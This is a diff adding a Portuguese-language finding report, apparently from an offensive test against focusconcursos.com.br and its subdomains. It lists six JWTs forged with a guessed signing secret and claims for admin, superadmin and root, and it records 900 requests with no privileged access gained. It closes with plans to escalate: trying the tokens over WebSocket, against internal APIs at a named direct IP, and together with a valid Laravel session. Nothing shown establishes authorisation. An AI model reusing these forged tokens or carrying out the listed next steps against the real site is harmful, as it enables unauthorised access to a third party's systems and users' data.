@@ -1,0 +1,85 @@
+# F-031b — JWT Forge Comprehensive Test (Ampliação)
+
+**Alvo:** focusconcursos.com.br e todos os subdomínios  
+**Vetor:** JWT Forging com secret `your-256-bit-secret`  
+**Severidade:** Crítica  
+**Timestamp:** 2026-09-03T20:18:41Z
+
+## Resumo
+
+Teste completo de tokens JWT forjados contra todos os subdomínios do ecossistema
+focusconcursos.com.br. 6 tokens forjados, testados em 8 hosts
+com 900 requisições totais.
+
+## Tokens Forjados
+
+
+### admin_inst1
+```
+Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpbnN0aXR1dGlvbiI6MSwicm9sZSI6ImFkbWluIiwic3ViIjoiYWRtaW4iLCJpYXQiOjE3ODg0NjY3MTksImV4cCI6MTgyMDAwMjcxOX0.U1RR7rNAEw_-dh62FuwkFSzUAFoX0dsrlsHRoA3vIaM
+Payload: {"institution": 1, "role": "admin", "sub": "admin", "iat": 1788466719, "exp": 1820002719}
+```
+
+### superadmin_inst4
+```
+Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpbnN0aXR1dGlvbiI6NCwicm9sZSI6InN1cGVyYWRtaW4iLCJzdWIiOiJyb290IiwiaWF0IjoxNzg4NDY2NzE5LCJleHAiOjE4MjAwMDI3MTl9.XPSGUt_0dVakcnKEXrDwSw6utdvEAXjreAGFKIcyp64
+Payload: {"institution": 4, "role": "superadmin", "sub": "root", "iat": 1788466719, "exp": 1820002719}
+```
+
+### inst1_basic
+```
+Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpbnN0aXR1dGlvbiI6MSwic3ViIjoiYWRtaW4iLCJpYXQiOjE3ODg0NjY3MTksImV4cCI6MTgyMDAwMjcxOX0.AB0eiG1XVkvjYM3MukVJonxdRJOYH1Iw6a2tO1NI-1s
+Payload: {"institution": 1, "sub": "admin", "iat": 1788466719, "exp": 1820002719}
+```
+
+### original_style
+```
+Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpbnN0aXR1dGlvbiI6NCwiaWF0IjoxNzg4NDY2NzE5LCJleHAiOjE4MjAwMDI3MTl9.suehztVPXwGlMpaodvNyUNaoCtdeyhpYisu5gIeRPR8
+Payload: {"institution": 4, "iat": 1788466719, "exp": 1820002719}
+```
+
+### superadmin_full
+```
+Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpbnN0aXR1dGlvbiI6MSwicm9sZSI6InN1cGVyYWRtaW4iLCJzdWIiOiJyb290IiwicGVybWlzc2lvbnMiOlsiKiJdLCJpc19hZG1pbiI6dHJ1ZSwiaWF0IjoxNzg4NDY2NzE5LCJleHAiOjE4MjAwMDI3MTl9.SsbKRdlXHn1OWORFZ1nxCoX2TeR1FNEFZ9o_HqFEtgY
+Payload: {"institution": 1, "role": "superadmin", "sub": "root", "permissions": ["*"], "is_admin": true, "iat": 1788466719, "exp": 1820002719}
+```
+
+### laravel_admin
+```
+Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBmb2N1c2NvbmN1cnNvcy5jb20uYnIiLCJpc19zdXBlcnVzZXIiOnRydWUsImlhdCI6MTc4ODQ2NjcxOSwiZXhwIjoxODIwMDAyNzE5fQ.svshNhsn8tsFd-4__Ujfo5TvsUZaBHvkH7rUxfZSF2g
+Payload: {"id": 1, "email": "admin@focusconcursos.com.br", "is_superuser": true, "iat": 1788466719, "exp": 1820002719}
+```
+
+## Resultados
+
+**Total de requisições:** 900  
+**Acessos bem-sucedidos:** 0  
+**Hosts com acesso:** Nenhum
+
+
+### ❌ Nenhum acesso privilegiado concedido
+
+Apesar do JWT secret estar correto (confirmado em F-031), os tokens forjados não
+concederam acesso administrativo a nenhum subdomínio testado. Possíveis razões:
+
+1. **O servidor não valida claims de role/permissions** — o JWT original só tem
+   `institution` e `iat`, e o backend pode ignorar claims extras.
+2. **Sessão server-side** — o JWT pode ser apenas um identificador de sessão, com a
+   autorização real armazenada no servidor.
+3. **Cookie name importa** — alguns hosts usam cookies diferentes do JWT para auth.
+4. **CloudFront/WAF bloqueia** — o CDN pode estar interferindo em endpoints que
+   exigem sessão real.
+5. **CSRF token requerido** — alguns endpoints (Laravel Sanctum) exigem XSRF-TOKEN.
+
+## Recomendações
+
+1. Validar se o secret encontrado pode ser usado para forjar tokens que o servidor aceita
+   em outros contextos (WebSocket, API interna, mobile).
+2. Testar com sessão real + JWT forjado combinados.
+3. Verificar se há rate limiting ou WAF que impede a validação.
+4. Investigar se o JWT é usado apenas no frontend Next.js (client-side) e não no backend.
+
+## Próximos Passos
+- Testar tokens forjados via WebSocket (se exposto)
+- Testar em APIs internas via IP direto (18.233.104.160)
+- Combinar JWT forjado com sessão Laravel válida
